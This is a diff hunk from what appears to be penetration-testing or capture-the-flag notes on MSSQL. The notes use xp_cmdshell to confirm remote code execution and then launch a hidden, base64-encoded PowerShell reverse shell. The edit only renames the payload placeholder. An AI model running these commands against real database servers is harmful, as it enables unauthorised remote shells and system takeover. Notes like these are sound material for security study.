@@ -16,5 +16,5 @@ EXECUTE xp_cmdshell 'whoami';
 > If we get a return of our command indicating that we have RCE, we can use a powershell encoded reverse shell script to get a reverse shell:
 
 ```
-EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <base64_shell>;
+EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <base64_string>;
 ```
